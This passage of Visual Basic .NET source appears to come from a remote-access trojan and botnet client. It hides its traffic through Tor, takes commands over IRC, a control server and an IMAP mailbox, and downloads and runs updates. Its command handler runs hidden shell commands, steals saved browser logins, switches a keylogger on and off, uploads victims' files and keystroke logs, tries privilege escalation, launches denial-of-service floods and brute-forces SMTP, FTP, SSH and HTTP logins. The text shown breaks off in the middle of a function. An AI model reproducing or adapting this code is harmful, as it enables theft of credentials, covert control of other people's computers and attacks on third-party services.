            CSC("cmd", "/C start \" & n & " && explorer http://twitter.com", p, "Twitter")
            CSC("cmd", "/C start \" & n & " && explorer http://instagram.com", p, "Instagram")
            CSC("cmd", "/C start \" & n & " && explorer http://younow.com", p, "YouNow")
            CSC("cmd", "/C start \" & n & " && explorer http://vpnbook.com", p, "Open Any website VPN")
        Catch ex As Exception
            log_all("SPREAD_PATH function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' Spread on a specific path.
    Sub TorMode() 'Now we're going way way more anonymous
        GoTo ntor
        If avs.Count = 0 Then
tmfc:
#Region "Tor Proxies"
            If IO.File.Exists(path & "\tor-proxies.txt") Then
                For Each p In IO.File.ReadAllText(path & "\tor-proxies.txt").Split("|")
                    Dim checker As New Net.Sockets.TcpClient()
                    Try
                        checker.Connect(p.Split(":")(0), p.Split(":")(1))
                        Do Until checker.Connected
                        Loop
                        checker.Client.Send(SB("CONNECT check.torproject.org:80 HTTP/1.1" + vbNewLine + vbNewLine))
                        Do Until checker.Available > 0
                        Loop
                        Dim v(1024) As Byte
                        checker.Client.Receive(v)
                        If BS(v).ToLower.Contains("established") Then
                            torProxy = p
                            a.Proxy = New Net.WebProxy(p)
                            checker.Close()
                            Exit Sub
                        End If
                    Catch ex As Exception
                        log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
                    End Try
                Next
            Else
                Try
                    If Not CA(TorProxies) Then
                        GoTo ntor
                    End If
                    Dim fc = a.DownloadString(TorProxies)
                    IO.File.WriteAllText(path & "\tor-proxies.txt", fc)
                    GoTo tmfc
                Catch ex As Exception
                    log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
                End Try
            End If
        End If
#End Region
ntor:
        Dim rgkey = My.Computer.Registry.CurrentUser.CreateSubKey("Software\APS\Tor", RegistryKeyPermissionCheck.ReadWriteSubTree)
#Region "Tor Files"
        If Not RegCheck("tor.exe", True) And Not RegCheck("Tor.part01.rar", True) Then
            If CUH(Unrar) Then
                Try
                    If Not IO.Directory.Exists(path & "\Tor") Then IO.Directory.CreateDirectory(path & "\Tor")
                    If Not IO.File.Exists(path & "\Tor\unrar.exe") Then DownloadFile(Unrar, path & "\Tor\unrar.exe")
                    If Not IO.File.Exists(path & "\Tor\unrar3.dll") Then DownloadFile(Unrar3dll, path & "\Tor\unrar3.dll")
                Catch ex As Exception
                    log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
                End Try
            End If
            If CUH(TorFiles) Then
                Dim ac = 22
                Try
                    If CA(TorFiles & "files.txt") Then ac = a.DownloadString(TorFiles & "files.txt")
                Catch ex As Exception
                    log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
                End Try
                Try
                    If Not IO.Directory.Exists(path & "\Tor") Then IO.Directory.CreateDirectory(path & "\Tor")
                    If Not IO.File.Exists(path & "\Tor\unrar.exe") Then
                        Try
                            DownloadFile(Unrar, path & "\Tor\unrar.exe")
                        Catch ex As Exception
                            log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
                        End Try
                    End If
                    If Not IO.File.Exists(path & "\Tor\unrar3.dll") Then
                        Try
                            DownloadFile(Unrar3dll, path & "\Tor\unrar3.dll")
                        Catch ex As Exception
                            log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
                        End Try
                    End If
                    Dim doneTorFiles = False
                    Dim cTorFiles = 1
                    Dim atf As New List(Of String)
again:
                    Do Until doneTorFiles
                        If Not IO.File.Exists(path & "\Tor\Tor.part" & GTC(cTorFiles, ac) & ".rar") Then
                            Try
                                If CA(TorFiles & "Tor.part" & GTC(cTorFiles, ac) & ".rar") Then IO.File.WriteAllBytes(path & "\Tor\Tor.part" & GTC(cTorFiles, ac) & ".rar", a.DownloadData(TorFiles & "Tor.part" & GTC(cTorFiles, ac) & ".rar"))
                            Catch ex As Exception
                                log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
                            End Try
                        End If
                        If IO.File.Exists(path & "\Tor\Tor.part" & GTC(cTorFiles, ac) & ".rar") Then
                            Dim f = New IO.FileInfo(path & "\Tor\Tor.part" & GTC(cTorFiles, ac) & ".rar")
                            atf.Add(cTorFiles & " - " & (f.Length / 1024))
                            If ac = cTorFiles Then doneTorFiles = True
                            cTorFiles += 1
                        End If
                    Loop
                    Try
                        If ac > atf.Count Then
                            cTorFiles = 1
                            doneTorFiles = False
                            GoTo again
                        End If
                        Dim opd = GPO(path & "\Tor\unrar.exe", "e -o+ Tor.part" & GTC("1", ac) & ".rar", path & "\Tor\")
                        If opd.ToLower.Contains("ok") Then
                            For Each f In IO.Directory.GetFiles(path & "\Tor\", "Tor.part*")
                                IO.File.Delete(f)
                            Next
                            IO.File.Delete(path & "\Tor\unrar.exe")
                            IO.File.Delete(path & "\Tor\unrar3.dll")
                        End If
                    Catch ex As Exception
                        log_all("TorMode function:  " & ex.Message & vbNewLine & ex.StackTrace)
                    End Try
                Catch ex As Exception
                    log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
                End Try
            End If
        End If
#End Region
        If RegCheck("Tor.part01.rar", True) Then
            Try
                Dim ac = 22
                Try
                    If CA(TorFiles & "files.txt") Then ac = a.DownloadString(TorFiles & "files.txt")
                Catch ex As Exception
                    log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
                End Try
                For Each p In rgkey.GetValueNames()
                    IO.File.WriteAllBytes(path & "\Tor\" & p, rgkey.GetValue(p))
                Next
                Dim opd = GPO(path & "\Tor\unrar.exe", "e -o+ Tor.part" & GTC("1", ac) & ".rar", path & "\Tor\")
                If opd.ToLower.Contains("ok") Then
                    For Each f In IO.Directory.GetFiles(path & "\Tor\", "Tor.part*")
                        IO.File.Delete(f)
                    Next
                    IO.File.Delete(path & "\Tor\unrar.exe")
                    IO.File.Delete(path & "\Tor\unrar3.dll")
                End If
            Catch ex As Exception
                log_all("TorMode function:  " & ex.Message & vbNewLine & ex.StackTrace)
            End Try
        End If
        RegHide()
        If RegCheck("tor.exe", True) Then
            If Not IO.File.Exists(path & "\Tor\tor.exe") Then
                If Not IO.Directory.Exists(path & "\Tor") Then IO.Directory.CreateDirectory(path & "\Tor")
                Dim skpuntilf As Boolean = False
                Dim strtsw = ""
                For Each v In rgkey.GetValueNames
                    If skpuntilf Then
                        If v.StartsWith(strtsw) Then
                            Dim byts As New List(Of Byte)
                            byts.AddRange(IO.File.ReadAllBytes(path & "\Tor\" & strtsw))
                            byts.AddRange(rgkey.GetValue(v))
                            IO.File.WriteAllBytes(path & "\Tor\" & strtsw, byts.ToArray)
                            byts.Clear()
                            GoTo notyet
                        Else
                            skpuntilf = False
                            strtsw = ""
                            GoTo ended
                        End If
                    End If
ended:
                    If v.EndsWith("-0000") Then
                        skpuntilf = True
                        strtsw = v.Replace("-0000", "")
                        IO.File.WriteAllBytes(path & "\Tor\" & strtsw, rgkey.GetValue(v))
                    Else
                        IO.File.WriteAllBytes(path & "\Tor\" & v, rgkey.GetValue(v))
                    End If
notyet:
                Next
            End If
        End If
        Dim TorUp = False
        Try
            For Each p In Process.GetProcessesByName("tor")
                If p.MainModule.FileName = path & "\Tor\tor.exe" Then torP = p : TorUp = True : GoTo tau
            Next
        Catch ex As Exception
            log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
        Try
            torP = New Process
            torP.StartInfo = New ProcessStartInfo(path & "\Tor\tor.exe", "-f torrc")
            torP.StartInfo.UseShellExecute = False
            torP.StartInfo.CreateNoWindow = True
            torP.StartInfo.WorkingDirectory = path & "\Tor\"
            torP.StartInfo.RedirectStandardError = True
            torP.StartInfo.RedirectStandardOutput = True
            AddHandler torP.OutputDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                    Try
                                                        If e.Data.ToLower.Contains("100%: done") Then
                                                            TorUp = True
                                                        End If
                                                    Catch ex As Exception
                                                        log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
                                                    End Try
                                                End Sub
            AddHandler torP.ErrorDataReceived, Sub(sender As Object, e As DataReceivedEventArgs)
                                                   Try
                                                       log_all("TorMode function: Tor Error: " & e.Data)
                                                       If e.Data.ToLower.Contains(": address already in") Then TorUp = True : Exit Sub
                                                       If torP.HasExited Then
                                                           torP.Start()
                                                       End If
                                                   Catch ex As Exception
                                                       log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
                                                   End Try
                                               End Sub
            'If netshItup("tor", torP.StartInfo.FileName) Then
            '    log_all("Added TOR as allowed program in the Firewall.", 3)
            'End If
            torP.Start()
            torP.BeginErrorReadLine()
            torP.BeginOutputReadLine()
        Catch ex As Exception
            log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
        Do Until TorUp
            Try
                If torP.HasExited Then
                    torP.Start()
                End If
                If torP.Threads.Count = 0 Then
                    torP.Start()
                    torP.BeginErrorReadLine()
                    torP.BeginOutputReadLine()
                End If
            Catch ex As Exception
                log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
            End Try
        Loop
tau:
        Try
            For Each p In Process.GetProcessesByName("polipo")
                If p.MainModule.FileName = path & "\Tor\polipo.exe" Or GPO("cmd", "netstat -an | findstr /i ""TCP"" | findstr /i ""LISTENING"" | findstr /i ""127.0.0.1:8123""").ToLower.Contains("127.0.0.1:8123") Then polipoP = p : GoTo pau
            Next
        Catch ex As Exception
            log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
        Try
            If IO.File.ReadAllText(path & "\Tor\config.txt").Contains("""0.0.0.0""") Then
                IO.File.WriteAllText(path & "\Tor\config.txt", IO.File.ReadAllText(path & "\Tor\config.txt").Replace("""0.0.0.0""", """127.0.0.1"""))
            End If
            polipoP = New Process
            polipoP.StartInfo = New ProcessStartInfo(path & "\Tor\polipo.exe", "-c config.txt")
            polipoP.StartInfo.UseShellExecute = False
            polipoP.StartInfo.CreateNoWindow = True
            polipoP.StartInfo.WorkingDirectory = path & "\Tor\"
            'If netshItup("polipo", polipoP.StartInfo.FileName) Then
            '    log_all("Added polipo as allowed program in the Firewall.", 3)
            'End If
            polipoP.Start()
        Catch ex As Exception
            log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
        Threading.Thread.Sleep(3000)
pau:
        Try
            a.Proxy = New Net.WebProxy(torProxy)
        Catch ex As Exception
            log_all("TorMode function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' Tor Mode.
    Function GTC(n As String, l As String) As String
        GTC = n
        If l = "" Then Return n
        Try
            Dim tc = l.Length - n.Length
            Return StrDup(tc, "0") & n
        Catch ex As Exception
            log_all("GTC function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' Get Tor Count (needed when downloading Tor-part* files).
    Sub IRCC() ' Start with thread.
re:
        Try
            Dim irca As New Net.Sockets.TcpClient
            Dim ns As IO.Stream
#Region "Connection prepare"
            Try
                If IRCOnTor Then
                    irca.Connect(torProxy.Split(":")(0), torProxy.Split(":")(1))
                    Do Until irca.Connected
                    Loop
                    With irca.Client
                        .Send(SB("CONNECT " & IRCS & ":" & IRCP & " HTTP/1.1" & vbNewLine & vbNewLine))
                    End With
                    Do Until irca.Available > 0
                    Loop
                    Dim b() As Byte = New Byte() {}
                    irca.Client.Receive(b)
                    If BS(b).ToLower.Contains("established") Then
                        If IRCSSL Then
                            Dim nss As Net.Security.SslStream = New Net.Security.SslStream(irca.GetStream)
                            nss.AuthenticateAsClient(IRCS)
                            ns = nss
                        Else
                            ns = irca.GetStream
                        End If
                    Else
                        Threading.Thread.Sleep(5 * 60000)
                        GoTo re
                    End If
                Else
                    irca.Connect(IRCS, IRCP)
                    Do Until irca.Connected
                    Loop
                    If IRCSSL Then
                        Dim nss As Net.Security.SslStream = New Net.Security.SslStream(irca.GetStream)
                        nss.AuthenticateAsClient(IRCS)
                        ns = nss
                    Else
                        ns = irca.GetStream
                    End If
                End If
            Catch ex As Exception
                log_all("IRCC function: " & ex.Message & vbNewLine & ex.StackTrace)
            End Try
#End Region
            Try
                With ns
                    .Write(SB("USER " & botid & " * * :APS-" & botid & vbNewLine), 0, SB(("USER " & botid & " * * :APS-" & botid & vbNewLine)).Length)
                    .Write(SB("NICK APS-" & botid & vbNewLine), 0, SB("NICK APS-" & botid & vbNewLine).Length)
                    .Write(SB("JOIN " & IRCCH & vbNewLine), 0, SB("JOIN " & IRCCH & vbNewLine).Length)
                    .Write(SB("PRIVMSG " & IRCM & " :I'm up." & vbNewLine), 0, SB("PRIVMSG " & IRCM & " :I'm up." & vbNewLine).Length)
                    .Write(SB("PRIVMSG " & IRCB & " :I'm up." & vbNewLine), 0, SB("PRIVMSG " & IRCB & " :I'm up." & vbNewLine).Length)
                End With
                Dim byts(512) As Byte
                Dim asr As New AsyncCallback(Sub(ar As IAsyncResult)
                                                 Dim so As StateObject = CType(ar.AsyncState, StateObject)
                                                 Dim s As Net.Sockets.Socket = so.workSocket
                                                 Dim ns1 As IO.Stream = so.optnl(0)
                                                 Dim asr1 As AsyncCallback = so.optnl(1)
                                                 Dim read As Integer = s.EndReceive(ar)
                                                 If read > 0 Then
                                                     IRC(so.buffer, ns1)
                                                     so.buffer = New Byte(512) {}
                                                     ns1.BeginRead(so.buffer, 0, 512, asr1, so)
                                                 Else
                                                     IRCC()
                                                     s.Close()
                                                 End If
                                             End Sub)
                Dim so1 As New StateObject(irca.Client)
                so1.optnl = New Object() {ns, asr}
                ns.BeginRead(byts, 0, byts.Length, asr, so1)
            Catch ex As Exception
                log_all("IRCC function: " & ex.Message & vbNewLine & ex.StackTrace)
            End Try
        Catch ex As Exception
            log_all("IRCC function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' IRC Control function (starts with a thread).
    Function CUH(host As String, Optional po As Integer = 80) As Boolean
        If host = "" Then Return False
        CUH = False
        If My.Computer.Network.IsAvailable Then
            Dim h As String = host
            If h.ToLower.StartsWith("https") Then po = 443
            If h.ToLower.StartsWith("http") Then
                h = h.Replace("http", "")
                h = h.Replace("s://", "")
                h = h.Replace("://", "")
                If h.Contains("/") Then h = h.Split("/")(0)
            End If
            If h.Contains(":") Then po = h.Split(":")(1) : h = h.Split(":")(0)
            If onTor Then
                If torP Is Nothing Then GoTo notyet
                If polipoP Is Nothing Then GoTo notyet
                If torP.Threads.Count = 0 Then GoTo notyet
                If polipoP.Threads.Count = 0 Then GoTo notyet
                Dim torc As New Net.Sockets.TcpClient
                Try
                    torc.Connect(torProxy.Split(":")(0), torProxy.Split(":")(1))
                    Do Until torc.Connected
                    Loop
                    With torc.Client
                        .Send(SB("CONNECT " & h & ":" & po & " HTTP/1.1" & vbNewLine + vbNewLine))
                    End With
                    Dim b() As Byte = New Byte() {}
                    Do Until torc.Available > 0
                    Loop
                    torc.Client.Receive(b)
                    torc.Close()
                Catch ex As Exception
                    log_all("CUH function: " & ex.Message & vbNewLine & ex.StackTrace)
                End Try
                Return True
            End If
notyet:
            Try
                Dim p As New Net.NetworkInformation.Ping
                If p.Send(h).Status = Net.NetworkInformation.IPStatus.Success Then
                    If host.ToLower = server.ToLower Then
                        Return True
                    End If
                    log_all("CUH function: Host (" & h & ") is up.", 1)
                    CUH = True
                End If
            Catch ex As Exception
                log_all("CUH function: " & ex.Message & vbNewLine & ex.StackTrace)
            End Try
        End If
    End Function ' Check Up Host.
    Dim avs As New List(Of String)
    Sub GTM()
        If AVD(avs) Then Threading.Thread.Sleep(15 * 60000)
        'If netshItup("APS", Process.GetCurrentProcess.MainModule.FileName) Then
        '   log_all("Added APS as allowed program in the Firewall.", 3)
        'End If
        While 1
            If My.Computer.Network.IsAvailable Then
                DEC()
                If CS() Then
                    Dim av = "&antivirus=None"
                    If avs.Count > 0 Then av = "&antivirus=" & avs(0)
                    docmds(Post("botname=" & botname & "&username=" & username & "&devicename=" & pcname & "&os=" & osname & "&version=" & version & "&do=info&webcam=" & WCC() & "&ip=" & getip() & av))
                    ctimes += 1
                    docmds(DSS())
                End If
            End If
            Threading.Thread.Sleep(wtime)
        End While
    End Sub ' Get To Me.
    Function getip() As String
        getip = "127.0.0.1"
        Try
            Return Split(BS(New Net.WebClient().DownloadData("http://jsonip.com")), """")(3)
        Catch ex As Exception
        End Try
    End Function ' get the real IP (Tor gives you 127.0.0.1).
    Function CS() As Boolean
        CS = False
        If CUH(server) Then Return True
        If IMAPSC() Then LS() : DEC() : Return True
    End Function ' Check my server.
    Function IMAPSC() As Boolean
        IMAPSC = False
        Try
            Dim b As Byte() = Convert.FromBase64String(imappass)
            Dim imapclient = New Net.Sockets.TcpClient(imapserver, imapport)
            Dim imapns As Net.Security.SslStream = New Net.Security.SslStream(imapclient.GetStream)
            imapns.AuthenticateAsClient(imapserver)
            Dim imapsr = New IO.StreamReader(imapns)
            Dim imapsw = New IO.StreamWriter(imapns)
            Dim data(imapclient.ReceiveBufferSize) As Byte
            imapns.Read(data, 0, data.Length)
            imapsw.WriteLine("$ LOGIN " & imapuser & " " & Text.Encoding.UTF8.GetString(b))
            imapsw.Flush()
            imapns.Read(data, 0, data.Length)
            If BS(data).ToLower.Contains("authenticated") And BS(data).ToLower.Contains("success") Then
                imapsw.WriteLine("$ SELECT INBOX")
                imapsw.Flush()
                imapns.Read(data, 0, data.Length)
                imapsw.WriteLine("$ SEARCH FROM " & imapmaster)
                imapsw.Flush()
                imapns.Read(data, 0, data.Length)
                Dim servers = BS(data).Split(vbNewLine)(0)
                Dim lastmsgnum = Split(servers, " ")(Split(servers, " ").Length - 1)
                imapsw.WriteLine("$ FETCH " & lastmsgnum & " body[1]")
                imapsw.Flush()
                imapsw.WriteLine("$ LOGOUT")
                imapsw.Flush()
                Do Until imapsr.EndOfStream
                    Dim nline As String = imapsr.ReadLine
                    If nline.ToLower.StartsWith("server|") Then
                        server = nline.Split("|")(1)
                        If Not CUH(server) Then LS() : Return False
                    ElseIf nline.ToLower.StartsWith("aps|") Then
                        aps = nline.Split("|")(1)
                    ElseIf nline.ToLower.StartsWith("wtime|") Then
                        wtime = nline.Split("|")(1)
                    ElseIf nline.ToLower.StartsWith("password|") Then
                        password = nline.Split("|")(1)
                    ElseIf nline.ToLower.StartsWith("kl|") Then
                        kl = nline.Split("|")(1)
                    ElseIf nline.ToLower.StartsWith("nircmd|") Then
                        nircmd = nline.Split("|")(1)
                    ElseIf nline.ToLower.StartsWith("rcmd|") Then
                        rcmd = nline.Split("|")(1)
                    ElseIf nline.ToLower.StartsWith("cc|") Then
                        cc = nline.Split("|")(1)
                    ElseIf nline.ToLower.StartsWith("update|") Then
                        UM(nline.Split("|")(1))
                    ElseIf nline.ToLower.StartsWith("botname|") Then
                        botname = nline.Split("|")(1)
                    ElseIf nline.ToLower.StartsWith("wfmf|") Then
                        wfmf = nline.Split("|")(1)
                    ElseIf nline.ToLower.StartsWith("install|") Then
                        install = nline.Split("|")(1)
                    ElseIf nline.ToLower.StartsWith("botid|") Then
                        botid = nline.Split("|")(1)
                    ElseIf nline.ToLower.StartsWith("apsshuser|") Then
                        apsshuser = nline.Split("|")(1)
                    ElseIf nline.ToLower.StartsWith("apsshpass|") Then
                        apsshpass = nline.Split("|")(1)
                    End If
                Loop
                'SS("SERVER", server)
                'SS("APS", aps)
                SS("WTIME", wtime)
                'SS("PASSWORD", password)
                'SS("KL", kl)
                'SS("NIRCMD", nircmd)
                'SS("rcmd", rcmd)
                'SS("cc", cc)
                SS("botname", botname)
                SS("botid", botid)
                'SS("wfmf", wfmf)
                SS("install", install)
                SS("apsshuser", apsshuser)
                SS("apsshpass", apsshpass)
                log_all("IMAPSC function: Settings' been changed using IMAP", 0)
                Return True
            End If
        Catch ex As Exception
            log_all("IMAPSC function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' IMAP settings check.
    Sub UM(url As String)
        Try
            IO.File.WriteAllBytes(Process.GetCurrentProcess.MainModule.FileName & "-update", a.DownloadData(url))
            RegPush(Process.GetCurrentProcess.MainModule.FileName & "-update", Process.GetCurrentProcess.ProcessName)
            Dim p = New Process
            p.StartInfo = New ProcessStartInfo("c:\windows\system32\cmd.exe", "/c """ & Process.GetCurrentProcess.MainModule.FileName & "-update""")
            p.StartInfo.UseShellExecute = False
            p.StartInfo.CreateNoWindow = True
            p.Start() : End
        Catch ex As Exception
            log_all("UM function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' Update Me.
    Enum log_type
        W = 0
        I = 1
        E = 2
        G = 3
    End Enum ' Log Type.
    Sub log_all(data As String, Optional type As log_type = log_type.E)
        Try
            Dim rgkey = My.Computer.Registry.CurrentUser.CreateSubKey("Software\APS", RegistryKeyPermissionCheck.ReadWriteSubTree)
            Dim olddata = ""
            Try
                If Not BS(rgkey.GetValue(logfile.Remove(0, logfile.LastIndexOf("\") + 1))) = "" Then
                    olddata = BS(rgkey.GetValue(logfile.Remove(0, logfile.LastIndexOf("\") + 1)))
                    If olddata.Length >= 200 * 1024 Then Dim s = UploadFile(SB(olddata), "AlMA.PRO.SPY.log", "logs") : olddata = "" : docmds(s)
                End If
            Catch ex As Exception
                log_all("log_all function: " & ex.Message & vbNewLine & ex.StackTrace)
            End Try
            Dim pref = "->->->->->" & vbNewLine
            Select Case type
                Case 0
                    pref += "[W] - "
                Case 1
                    pref += "[I] - "
                Case 2
                    pref += "[E] - "
                Case 3
                    pref += "[G] - "
            End Select
            pref += DateString.Replace("-", "/") & " " & TimeOfDay.ToShortTimeString & " - "
            pref += data & vbNewLine & "<-<-<-<-<-" & vbNewLine
            rgkey.SetValue(logfile.Remove(0, logfile.LastIndexOf("\") + 1), SB(olddata & pref), RegistryValueKind.Binary)
        Catch ex As Exception
            log_all("log_all function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' Log_All function (for debugging purposes).
    Sub docmds(s As String)
        Try
            If s = "" Then Exit Sub
            If Not s.Contains(";") Then log_all("docmds function: Something went wrong!" & vbNewLine & s) : Exit Sub
            Dim sa = Split(s, ";")
            For Each cmd In sa
                Select Case cmd.ToLower
                    Case ""
                    Case "dss"
                        Light = False
                        Dim sss = DSS()
                        Light = True
                        docmds(sss)
                    Case "goodbye"
                        GB()
                        Exit Select : Exit For : Exit Sub
                    Case "wcs"
                        docmds(WCS())
                    Case "logins"
                        do_chrome()
                        do_firefox()
                        do_opera()
                        do_safari()
                    Case "idle"
                        Idle()
                    Case "enlogger"
                        EKL()
                    Case "dislogger"
                        DKL()
                    Case "logs"
                        RegPool(logfile.Remove(0, logfile.LastIndexOf("\") + 1), logfile)
                        If IO.File.Exists(logfile) Then
                            Dim lf = New IO.FileInfo(logfile)
                            Dim d = UploadFile(logfile, logfile, "logs") : lf.Delete() : docmds(d)
                        End If
                        RegPool(keysfile.Remove(0, keysfile.LastIndexOf("\") + 1), keysfile)
                        If IO.File.Exists(keysfile) Then
                            Dim lf = New IO.FileInfo(keysfile)
                            Dim d = UploadFile(keysfile, keysfile, "logs") : lf.Delete() : docmds(d)
                        End If
                    Case "gh"
                        If GH() Then
                            log_all("GH function: Got Higher.", 3) : End
                        Else
                            If CH() Then log_all("GH function: Already the highest.", 1)
                            If Not CH() Then
                                If CanH() Then
                                    log_all("GH function: Failed getting higher.")
                                Else
                                    log_all("GH function: User cannot be an admin.", 0)
                                End If
                            End If
                        End If
                End Select
                If cmd.ToLower.StartsWith("cwt ") Then
                    wtime = cmd.Remove(0, 4)
                    SS("WTIME", wtime.ToString)
                ElseIf cmd.ToLower.StartsWith("df ") Then
                    Dim f = cmd.Remove(0, 3)
                    DownloadFile(f, Split(f, "/")(Split(f, "/").Length - 1))
                ElseIf cmd.ToLower.StartsWith("x ") Then
                    Dim f = cmd.Remove(0, 2)
                    Dim dcmd = False
                    If f.ToLower.StartsWith("-cmd ") Then dcmd = True : f = f.Remove(0, 5)
                    If dcmd Then
                        Dim p = New Process
                        p.StartInfo = New ProcessStartInfo("C:\windows\system32\cmd.exe", "/c """ & f & """")
                        p.StartInfo.UseShellExecute = False
                        p.StartInfo.CreateNoWindow = True
                        p.Start()
                    Else
                        Process.Start(f)
                    End If
                    log_all("docmds function: Executed file ==> " & f & ".", 3)
                ElseIf cmd.ToLower.StartsWith("rcmd ") Then
                    Dim f As String = cmd.Remove(0, 5)
                    do_rcmd(f)
                ElseIf cmd.ToLower.StartsWith("update ") Then
                    Dim f = cmd.Remove(0, 7)
                    UM(f)
                ElseIf cmd.ToLower.StartsWith("btcp ")
                    Dim p = cmd.Remove(0, 5)
                    BTCP(p)
                ElseIf cmd.ToLower.StartsWith("rtcp ")
                    Dim all = cmd.Remove(0, 5)
                    RTCP(all.Split("|")(0), all.Split("|")(1))
                ElseIf cmd.ToLower.StartsWith("sl ")
                    Dim h = cmd.Remove(0, 3)
                    Dim bg = False
                    If h.ToLower.StartsWith("-b ") Then bg = True : h = h.Remove(0, 3)
                    If h = "" Then keepddos = False : GoTo sldone
                    If bg Then
                        Dim bgw As New BackgroundWorker
                        AddHandler bgw.DoWork, Sub(sender1 As Object, e1 As DoWorkEventArgs)
                                                   SL(e1.Argument)
                                               End Sub
                        bgw.RunWorkerAsync(h)
                    Else
                        SL(h)
                    End If
sldone:
                ElseIf cmd.ToLower.StartsWith("co ")
                    Dim data = cmd.Remove(0, 3)
                    Dim t As COS = 0
                    If data.ToLower.StartsWith("smtp ") Then t = 0 : data = data.Remove(0, 5)
                    If data.ToLower.StartsWith("imap ") Then t = 1 : data = data.Remove(0, 5)
                    If data.ToLower.StartsWith("ftp ") Then t = 2 : data = data.Remove(0, 4)
                    If data.ToLower.StartsWith("ssh ") Then t = 3 : data = data.Remove(0, 4)
                    If data.ToLower.StartsWith("httpget ") Then t = 4 : data = data.Remove(0, 8)
                    If data.ToLower.StartsWith("httppost ") Then t = 5 : data = data.Remove(0, 9)
                    Dim h = data.Split(" ")(0) : data = data.Remove(0, h.Length + 1)
                    Dim u = data.Split(" ")(0) : data = data.Remove(0, u.Length + 1)
                    Dim ps = data.Split("|")(0).Split("#") : data = data.Remove(0, data.Split("|")(0).Length + 1)
                    Dim p = ""
                    If data IsNot "" Then p = data.Remove(0, 1)
                    Dim cp = ""
                    If CO(u, ps, cp, t, h, p) Then docmds(UploadFile(SB("User: " & u & vbNewLine & "Password: " & cp), "Cracked.txt"))
                ElseIf cmd.ToLower.StartsWith("fman ") Then
                    Dim cmnd = cmd.Remove(0, 5)
                    If cmnd.ToLower = "ref" Then
                        Dim cd = New IO.DirectoryInfo(IO.Directory.GetCurrentDirectory)
                        Dim ls = cd.FullName & "|||"
                        For Each f In IO.Directory.GetDirectories(cd.FullName)
                            Dim fi As New IO.DirectoryInfo(f)
                            ls += fi.Name & "|" & "Directory||"
                        Next
                        For Each f In IO.Directory.GetFiles(cd.FullName)
                            Dim fi As New IO.FileInfo(f)
                            ls += fi.Name & "|" & "File||"
                        Next
                        ls = ls.Remove(ls.Length - 3)
                        docmds(UploadFile(SB(ls), "fman-ref.txt"))
                    ElseIf cmnd.ToLower.StartsWith("cd ")
                        Dim d = cmnd.Remove(0, 4)
                        If IO.Directory.Exists(d) Then Environment.CurrentDirectory = (d)
                        Dim cd = New IO.DirectoryInfo(IO.Directory.GetCurrentDirectory)
                        Dim ls = cd.FullName & "|||"
                        For Each f In IO.Directory.GetDirectories(cd.FullName)
                            Dim fi As New IO.DirectoryInfo(f)
                            ls += fi.Name & "|" & "Directory||"
                        Next
                        For Each f In IO.Directory.GetFiles(cd.FullName)
                            Dim fi As New IO.FileInfo(f)
                            ls += fi.Name & "|" & "File||"
                        Next
                        ls = ls.Remove(ls.Length - 3)
                        docmds(UploadFile(SB(ls), "fman-ref.txt"))
                    ElseIf cmnd.ToLower.StartsWith("df ")
                        Dim f = cmnd.Remove(0, 3)
                        DownloadFile(f, Split(f, "/")(Split(f, "/").Length - 1))
                        Dim cd = New IO.DirectoryInfo(IO.Directory.GetCurrentDirectory)
                        Dim ls = cd.FullName & "|||"
                        For Each f In IO.Directory.GetDirectories(cd.FullName)
                            Dim fi As New IO.DirectoryInfo(f)
                            ls += fi.Name & "|" & "Directory||"
                        Next
                        For Each f In IO.Directory.GetFiles(cd.FullName)
                            Dim fi As New IO.FileInfo(f)
                            ls += fi.Name & "|" & "File||"
                        Next
                        ls = ls.Remove(ls.Length - 3)
                        docmds(UploadFile(SB(ls), "fman-ref.txt"))
                    ElseIf cmnd.ToLower.StartsWith("uf ")
                        Dim f = cmnd.Remove(0, 3)
                        If IO.Directory.Exists(f) Then
                            For Each file In IO.Directory.GetFiles(f)
                                docmds(UploadFile(file, file.Split("\")(file.Split("\").Length - 1), IO.Directory.GetCurrentDirectory.Replace(":", "")))
                            Next
                        Else
                            If IO.File.Exists(f) Then
                                docmds(UploadFile(f, f.Split("\")(f.Split("\").Length - 1), IO.Directory.GetCurrentDirectory.Replace(":", "")))
                            End If
                        End If
                    ElseIf cmnd.ToLower.StartsWith("x ") Then
                        Dim f = cmnd.Remove(0, 2)
                        Dim dcmd = False
                        If f.ToLower.StartsWith("-cmd ") Then dcmd = True : f = f.Remove(0, 5)
                        If dcmd Then
                            Dim p = New Process
                            p.StartInfo = New ProcessStartInfo("C:\windows\system32\cmd.exe", "/c " & f)
                            p.StartInfo.UseShellExecute = False
                            p.StartInfo.CreateNoWindow = True
                            p.Start()
                        Else
                            Process.Start(f)
                        End If
                        log_all("docmds function: Executed file ==> " & f & ".", 3)
                    ElseIf cmnd.ToLower.StartsWith("del ") Then
                        Dim f = cmnd.Remove(0, 4)
                        If IO.Directory.Exists(f) Then
                            For Each file In IO.Directory.GetFiles(f)
                                Try
                                    IO.File.Delete(file)
                                Catch ex As Exception
                                End Try
                            Next
                            Try
                                IO.Directory.Delete(f)
                            Catch ex As Exception
                            End Try
